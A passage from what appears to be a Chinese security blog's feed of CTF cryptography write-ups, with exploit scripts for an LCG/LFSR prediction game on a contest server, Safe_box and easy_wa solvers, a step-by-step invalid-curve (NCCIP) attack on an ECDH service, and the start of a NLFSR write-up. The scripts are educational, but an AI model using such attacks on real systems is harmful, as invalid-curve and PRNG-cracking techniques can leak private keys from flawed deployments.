states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用初值和随后LCG产生的连续的几个值,恢复模数n</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    modulus:模数n</span></span><br><span class="line"><span class="string">    states:伪随机数序列s</span></span><br><span class="line"><span class="string">    diffs:相邻随机数s的差值：t序列</span></span><br><span class="line"><span class="string">              zeroes:与t系列有关的差值，zeroes = t2*t0 - t1*t1,t0,t1,t2相邻</span></span><br><span class="line"><span class="string">    return:根据n,s0,s1,s2恢复m，然后利用crack_unknown_increment恢复c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed,params)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    LCG算法</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    params:(multiplier,increment,modulus)</span></span><br><span class="line"><span class="string">    seed:伪随机序列中第一个值s0</span></span><br><span class="line"><span class="string">    return：返回一个迭代器，其中的值是私钥序列</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    (m,c,n)=params</span><br><span class="line">    x = seed % n</span><br><span class="line">    <span class="keyword">yield</span> int(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (m * x + c) % n</span><br><span class="line">        <span class="keyword">yield</span> int(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(pri,pub,c,p)</span>:</span>    </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ElGamal解密算法</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pri:一方私钥</span></span><br><span class="line"><span class="string">    pub:另一方公钥</span></span><br><span class="line"><span class="string">    sharekey:双方协商密钥</span></span><br><span class="line"><span class="string">    c:密文</span></span><br><span class="line"><span class="string">    p:模数</span></span><br><span class="line"><span class="string">    m:明文</span></span><br><span class="line"><span class="string">    return:返回明文字符</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sharekey = pow(pub,pri,p)</span><br><span class="line">    m=long_to_bytes(c*inverse(sharekey,p)%p)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n, key, r, b)</span>:</span></span><br><span class="line">        self.n = n<span class="comment">#40</span></span><br><span class="line">        self.key = key </span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b<span class="comment">#8</span></span><br><span class="line">                 </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |=  o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getr</span><span class="params">(s)</span>:</span></span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            r = each+r</span><br><span class="line">    <span class="keyword">print</span> int(r,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> int(r,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(s)</span>:</span></span><br><span class="line">    k=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            k += each</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line">        </span><br><span class="line">sh = remote(<span class="string">'59.110.243.101'</span>,<span class="string">'5123'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Baby:"</span>)</span><br><span class="line">Baby = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Easy:"</span>)</span><br><span class="line">Easy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Normal:"</span>)</span><br><span class="line">Normal = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Hard:"</span>)</span><br><span class="line">Hard = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Master:"</span>)</span><br><span class="line">Master = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Crazy:"</span>)</span><br><span class="line">Crazy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">pri=[Baby,Easy,Normal,Hard,Master,Crazy]</span><br><span class="line"></span><br><span class="line">(n,m,c)=crack_unknown_modulus([int(each) <span class="keyword">for</span> each <span class="keyword">in</span> pri])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=int(pri[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">key = lcg(x,(m,c,n))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    next(key)</span><br><span class="line">choice = next(key)</span><br><span class="line">sh.recvuntil(<span class="string">"Input the level code:\n"</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(str(choice))</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#flag=""</span></span><br><span class="line">s=[]</span><br><span class="line">F = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Right'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        F = <span class="number">1</span></span><br><span class="line">        print(<span class="string">"NICE"</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> F == <span class="number">1</span>:</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">r = getr(s[:<span class="number">5</span>])</span><br><span class="line">output = getk(s[:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"r:"</span>+str(r)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"output:"</span>+ output</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">k = input(<span class="string">"k:"</span>)</span><br><span class="line">game = Game(<span class="number">40</span>,k,r,<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    next(game)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(str(next(game)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0x3f</span> bytes:</span><br><span class="line">    <span class="string">'Your coin: 500\n'</span></span><br><span class="line">    <span class="string">'You Win!\n'</span></span><br><span class="line">    <span class="string">'flag&#123;12727f129b72e685388c6a67538ee9b0&#125;\n'</span></span><br></pre></td></tr></table></figure><p>最后五分钟出flag，太幸运了。<del>就是没队伍，有点浪费了</del>。</p><h1 id="玄武组"><a href="#玄武组" class="headerlink" title="玄武组"></a>玄武组</h1><h2 id="Safe-box"><a href="#Safe-box" class="headerlink" title="Safe_box"></a>Safe_box</h2><p>主要逻辑</p><ol><li>过了PoW进行交互</li><li>1可以得到一组23*20的key</li><li>3可以得到flag的密文c</li><li>加密函数生成23*40的key，一共23组明文，每组明文加密40次，记录每次的结果</li><li>每一次的加密逻辑为b = m + Σ((a_j*<em>i)</em>e_i)，其中a_j为组里的加密次数，j=1，2，，40；e_i为列表e里的每一个元素，i = 1，2，3，，,29</li></ol><p>解密流程</p><ol><li>第一组，当i=0时，a=1，b_1 = m_1 + Σ(e_i)</li><li>第二组，当i=0时，a=1，b_2 = m_2 + Σ(e_i)</li><li>第三组，当i=0时，a=1，b_3 = m_3 + Σ(e_i)</li><li>我们得到的23组信息中的每组的第一条就是b_1, b_2，b_3</li><li>所以我们只需要获得Σ(e_i)就可以还原所有的m</li><li>被加密的是pri，pri是PEM文件格式，有固定的开头、结尾格式，所以我们知道部分明文，所以我们知道m_1</li><li>利用b_1和m_1获取Σ(e_i)</li><li>再利用b_1,,,b_23和Σ(e_i) 获取所有m</li><li>再利用私钥文件对flag进行解密</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">ms = re.findall(<span class="string">"&#123;'a': 1, 'b': (.*?)L&#125;"</span>,data)</span><br><span class="line">c = re.findall(<span class="string">"flag:(.*)"</span>,data)</span><br><span class="line">m1 = <span class="string">b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIB'</span></span><br><span class="line">es = int(ms[<span class="number">0</span>])-bytes_to_long(m1)</span><br><span class="line"><span class="keyword">print</span> es</span><br><span class="line">pri=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ms:</span><br><span class="line">    pri = pri + long_to_bytes(int(i)-es)</span><br><span class="line"><span class="keyword">print</span> pri</span><br><span class="line">pri = RSA.importKey(pri.replace(<span class="string">"\\"</span><span class="string">","</span><span class="string">"))</span></span><br><span class="line"><span class="string">print(long_to_bytes(pow(int(c[0]),pri.d,pri.n)))</span></span><br></pre></td></tr></table></figure><h2 id="easy-wa"><a href="#easy-wa" class="headerlink" title="easy_wa"></a>easy_wa</h2><p>bytectf原题lrlr的一个part</p><p><a href="https://blog.csdn.net/qq_33458986/article/details/100699263" target="_blank" rel="noopener">https://blog.csdn.net/qq_33458986/article/details/100699263</a></p><p>calc是一个多项式在GF(2)下的平方运算，我们要做的应该是求根。</p><p>但是这里给出的既约多项式的阶不大，我们一直平方下去，很快就能回到起点。所以直接拿密文去calc就行了。</p><p>先交互，过那个恶心的PoW <del>跟青龙组那个一样，再看看名字，同一个出题人，凑！</del>，输入token拿到4组密文</p><p>然后每组分别解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom <span class="keyword">as</span> ua</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">magic=<span class="number">32805</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(m,p)</span>:</span></span><br><span class="line">    res=<span class="number">0</span></span><br><span class="line">    lens=hlen(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(m)[<span class="number">2</span>:]:</span><br><span class="line">        res*=<span class="number">2</span></span><br><span class="line">        res^=m <span class="keyword">if</span> i==<span class="string">'1'</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        res^=p <span class="keyword">if</span> hlen(res) == lens <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">flags=[<span class="number">3723147309</span>,<span class="number">8016759097521062564</span>,<span class="number">267529443716352603115102819467183104162</span>,<span class="number">110068498753042154535753131190467876514149603112955078214309283006458454378660</span>]</span><br><span class="line">FLAG=<span class="string">""</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    r*=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag=calc(flag,magic + (<span class="number">1</span>&lt;&lt;r*<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> check(long_to_bytes(flag)[:<span class="number">10</span>]):</span><br><span class="line">            FLAG+=(long_to_bytes(flag))</span><br><span class="line">            <span class="keyword">print</span> FLAG</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><del>就这么ak了网鼎杯的密码学？赵总原话：这届密码学不行。</del></p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 NCCIP</title>
      <link href="/2020/05/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/"/>
      <url>/2020/05/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BNCCIP/</url>
      
        <content type="html"><![CDATA[<p>文章首发于<a href="https://www.anquanke.com/post/id/204397" target="_blank" rel="noopener">安全客</a></p><h2 id="De1CTF-ECDH"><a href="#De1CTF-ECDH" class="headerlink" title="De1CTF  - ECDH"></a>De1CTF  - ECDH</h2><p><a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH.zip" target="_blank" rel="noopener">赛题附件</a>在这里，然后审计代码之后，可以把这个问题概括为：</p><ol><li>题目用的是标准曲线：$y^2 \equiv x^3 +ax + b \pmod{p}$，并提供a,b,p</li><li>函数 Exchange：ECDH问题，生成共享密钥时你提供一个点P，他会用自己的私钥，secret*P生成协商密钥key</li><li>函数 Encrypt：用key加密你的输入，加密方式为将key的x和y拼接后于输入简单异或</li><li>函数 Backdoor：输入服务端secret值，返回flag</li></ol><p>整体流程算是一个标准的ECDH，但在标准的ECDH中，一方应该是无法计算出另一方的私钥的，否则这个算法就GG了。而这一题的漏洞就在于，在密钥交换的过程中，服务端并没有检查你提供的点是否在规定好的曲线上。所以这里的攻击方式就是”No Correctness Check for Input Points” (NCCIP) attacks。</p><p>由有限域上椭圆曲线上整数点的加法计算式：</p><p>设：已知曲线 $y^2 \equiv x^3 +ax + b \pmod{p}$ 和 P(x1,y1) 和 Q(x2,y2) ，我们计算R(x3,y3) = P + Q </p><p>x3 ≡ k2-x1 - x2 (mod p)</p><p>y3 ≡ k(x1-x3) - y1 (mod p)</p><p>若P = Q 则 k = (3*x2+a)/(2y1) mod p</p><p>若P ≠ Q，则k = (y2-y1)/(x2-x1) mod p</p><p>曲线的阶与b值有关，但是我们发现，在整个加法、乘法（从加法引申到乘法是一件极其自然的事）计算的过程中，点R却与曲线的b值无关，所以，如果更改b的值，生成一条新的曲线，且这个曲线的阶有一个很小的因子，比如只有7，那么这个曲线上一定会有阶为7的点。如果我们将这个点传给服务端。而服务端没有检查我们这个点的合法性，直接拿来计算生成key，会产生怎么样的后果呢？</p><p>我们假设点P的阶为7，即 7*P = O∞，再设secret值为31</p><p>那么服务端就会计算31*P  ≡ 3P</p><p>由于阶很小，我们可以遍历得到 key = 3P，等价于，我们知道了secret % 7 = 3</p><p>所以，我们只要多找这么几个低阶点，多得到几条这样的同余式，最后利用CRT就可以恢复secret了。</p><p>【呃，再简要说明一下我们的操作叭，我们更改了b的值，造了一条新的曲线，并且在上面找了一个低阶点。而这个点拿去服务端运算，运算只需要这个点的x坐标，y坐标和曲线的a值，所以可以理解为，因为服务端没有检查输入点的合法性，导致，服务端用的曲线被我们窜改了。】</p><h3 id="step1-找到有低阶点的曲线"><a href="#step1-找到有低阶点的曲线" class="headerlink" title="step1-找到有低阶点的曲线"></a>step1-找到有低阶点的曲线</h3><p>​        我们要找到低阶点，我们就先要找到一条阶有小因子的曲线。</p><p>​        由于sympy分解大数速度似乎有点慢，于是我们直接更改b的值，生成一条新的曲线，然后计算、再去<a href="http://www.factordb.com/" target="_blank" rel="noopener">在线平台</a>分解这条曲线的阶，看看是否有小因子。</p><p>​        有一条曲线，但是上面的生成元点怎么找呢？这里我们改一改，先确定一个点，然后再去确定b值从而确定曲线，然后去计算、分解这个点的阶。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">y = 20</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line"></span><br><span class="line">for _ in range(60):</span><br><span class="line">    y+=1</span><br><span class="line">    b = (y**2 - x**3- a*x)%q</span><br><span class="line">    ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">    G = ecc(x,y)</span><br><span class="line">    print(y)</span><br><span class="line">    print(G.order())</span><br></pre></td></tr></table></figure><h3 id="step2-找到低阶点"><a href="#step2-找到低阶点" class="headerlink" title="step2-找到低阶点"></a>step2-找到低阶点</h3><p>有一条阶有小因子的线了，有上面的一个点G，且知道它的阶了，低阶点怎么找呢？</p><p>这里有一个很简单的道理，我们知道，77，可以等于7乘以11，也可以等于11乘以7。所以，如果我们这个点G的阶是77，那么，7*P的阶就是11，11*P的阶就是7了。</p><p>这里，我们通过上面的脚本得到一个阶为$2 * 3 * 5^2  *  83 * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923$的点G，从而我们可以得到阶分别为2，3，5，83，13313的点（后面的就不要了，阶太大，之后遍历耗时也太长了，大概一万左右的是我们可以接受的。）</p><p>下面的脚本就可以得到一个阶为83的点P</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = 0xb55c08d92cd878a3ad444a3627a52764f5a402f4a86ef700271cb17edfa739ca</span><br><span class="line">q = 0xdd7860f2c4afe6d96059766ddd2b52f7bb1ab0fce779a36f723d50339ab25bbd</span><br><span class="line">a = 0x4cee8d95bb3f64db7d53b078ba3a904557425e2a6d91c5dfbf4c564a3f3619fa</span><br><span class="line">y = 314</span><br><span class="line"></span><br><span class="line">b = (y^2 - x^3- a*x)%q</span><br><span class="line">ecc = EllipticCurve(GF(q), [a,b])</span><br><span class="line">G = ecc(x,y)</span><br><span class="line">print(G  * 2 * 3 * 5^2  * 13313 * 45413 *6654245328558174325218919079449691616264872121315671061356825923)</span><br></pre></td></tr></table></figure><h3 id="step3-计算协商密钥"><a href="#step3-计算协商密钥" class="headerlink" title="step3-计算协商密钥"></a>step3-计算协商密钥</h3><p>我们将这个点P当做我们的公钥传给服务端，他会用secret*P 计算协商密钥key</p><p>需要说明的是，由于我们破坏了规则，导致服务端的公钥已经不能用了，况且，其实我们自己也不知道自己的私钥是啥。所以这个协商密钥我们还得利用加密函数来获取。</p><p>具体操作见下面交互脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">"choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"Encrypt"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"hex):\n"</span>)</span><br><span class="line">mess = <span class="string">"a"</span>*<span class="number">512</span></span><br><span class="line">sh.sendline(mess)</span><br><span class="line">sh.recvuntil(<span class="string">"The result is:\n"</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">key = int(mess,<span class="number">16</span>)^int(res,<span class="number">16</span>)</span><br><span class="line">x , y = key &gt;&gt; q.bit_length() , key &amp; ((<span class="number">1</span> &lt;&lt; q.bit_length()) - <span class="number">1</span>)</span><br><span class="line">G = (x,y)</span><br></pre></td></tr></table></figure><p>由于q是256位的，所以key是512位，所以我们传个512位的明文过去。然后异或回来，分离一下，我们就可以得到secret*P这个点了。</p><h3 id="step4-计算secret的一个剩余"><a href="#step4-计算secret的一个剩余" class="headerlink" title="step4-计算secret的一个剩余"></a>step4-计算secret的一个剩余</h3><p>知道key了，我们就可以遍历计算secret关于这个低阶的剩余了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">G = (x,y)<span class="comment">#key</span></span><br><span class="line">Q = (int(each[<span class="number">0</span>]),int(each[<span class="number">1</span>]))<span class="comment">#我们找到的低阶点Q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(each[<span class="number">2</span>])):</span><br><span class="line"><span class="keyword">if</span> mul(i,Q) == G:</span><br><span class="line">reslist.append(i)<span class="comment">#secret的剩余</span></span><br><span class="line">N.append(int(each[<span class="number">2</span>]));<span class="keyword">print</span> (i,int(each[<span class="number">2</span>])) <span class="comment">#secret的剩余对应的阶</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="step5-利用CRT计算secret"><a href="#step5-利用CRT计算secret" class="headerlink" title="step5-利用CRT计算secret"></a>step5-利用CRT计算secret</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * inverse(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line">secret = CRT(N, reslist)</span><br></pre></td></tr></table></figure><p>完整exp放在<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/NCCIP/ECDH-exp.zip" target="_blank" rel="noopener">这里</a>了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人认为，NCCIP问题主要还是因为服务端的曲线被窜改为阶有小因子的不安全的曲线，从而造成了私钥部分信息的泄露。通过这个问题，自己对ECC也有了更进一步的认识。</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> ECC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF</title>
      <link href="/2020/05/05/2020De1CTF/"/>
      <url>/2020/05/05/2020De1CTF/</url>
      
        <content type="html"><![CDATA[<p>题目和exp塞<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/05/2020De1CTF/2020De1CFT.zip" target="_blank" rel="noopener">这里</a>了。</p><h3 id="NLFSR"><a href="#NLFSR" class="headerlink" title="NLFSR"></a>NLFSR</h3><p>改编自<a href="https://wiki.x10sec.org/crypto/streamcipher/fsr/nfsr/" target="_blank" rel="noopener">2018年的强网杯streamgame3</a>，式子可以化简</p><p>(ao * bo) ^ (bo * co) ^ (bo * do) ^ co ^ do = (ao * bo) ^ (bo * (co ^ do)) ^ (co ^ do)</p><p>[把co ^ do 设为=&gt;eo ]   =&gt;   (ao * bo) ^ (bo *eo )) ^  eo   这样子又只有三个寄存器了。</p><p>然后我们看一下关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> bo <span 